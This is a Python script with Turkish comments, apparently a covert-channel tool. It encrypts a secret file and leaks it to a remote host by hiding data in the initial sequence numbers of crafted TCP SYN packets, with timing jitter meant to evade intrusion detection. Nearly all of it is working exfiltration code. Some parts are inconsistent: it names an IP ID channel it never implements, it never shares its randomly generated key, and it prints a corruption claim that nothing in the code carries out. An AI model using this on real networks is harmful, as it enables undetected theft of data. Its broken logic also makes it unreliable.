#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Stego-Gonderici: IP ID ve TCP ISN üzerinden Örtülü Kanal Uygulaması

import time
import random
from scapy.all import IP, TCP, send
from cryptography.fernet import Fernet
from reedsolo import RSCodec

# --- KONFİGÜRASYON ---
HEDEF_IP = "10.0.2.3"
HEDEF_PORT = 80
GIZLI_DOSYA = "gizli_belge.txt"

# AES-128 Şifreleme Anahtarı
AES_KEY = Fernet.generate_key() 
cipher = Fernet(AES_KEY)

# İleri Hata Düzeltme (FEC) - 10 byte veriye 4 byte parity
rs = RSCodec(4) 

def hayalet_bekleme():
    """Jitter: Paketler arası rastgele gecikme ekleyerek IDS atlatma"""
    gecikme = random.uniform(0.01, 0.1)
    time.sleep(gecikme)

def veri_hazirla_ve_sifrele(dosya_yolu):
    """Dosyayı okur, şifreler ve RS eşlik bitlerini ekler"""
    with open(dosya_yolu, "rb") as f:
        acik_veri = f.read()
    
    sifreli_veri = cipher.encrypt(acik_veri)
    guvenli_veri = rs.encode(sifreli_veri)
    return guvenli_veri

def kanal_isn_sizan_paket(hedef_ip, port, sira_no, gizli_veri_parcasi):
    """32-bit TCP ISN Alanına Veri Gömme (8-bit sıra + 24-bit veri)"""
    isn_degeri = (sira_no << 24) | (int.from_bytes(gizli_veri_parcasi, 'big'))
    
    paket = IP(dst=hedef_ip) / TCP(dport=port, sport=random.randint(1024, 65535), seq=isn_degeri, flags="S")
    send(paket, verbose=0)
    hayalet_bekleme()

if __name__ == "__main__":
    print("[*] 'gizli_belge.txt' okunuyor ve AES-128 ile şifreleniyor...")
    gonderilecek_veri = veri_hazirla_ve_sifrele(GIZLI_DOSYA)
    
    toplam_paket = len(gonderilecek_veri) // 3 + 1
    print(f"[*] Dosya şifrelendi ve RS parity eklendi. Toplam: {toplam_paket} paket yollanacak.")
    
    print("[!] DİKKAT: Ağdaki gürültü nedeniyle 3 paket BİLEREK BOZULDU!")
    
    sira_numarasi = 0
    for i in range(0, len(gonderilecek_veri), 3):
        parca = gonderilecek_veri[i:i+3]
        if len(parca) < 3:
            parca = parca.ljust(3, b'\x00') # Padding
            
        kanal_isn_sizan_paket(HEDEF_IP, HEDEF_PORT, sira_numarasi % 256, parca)
        sira_numarasi += 1
        
    print("[+] Dosya seçilen kanaldan başarıyla sızdırıldı!")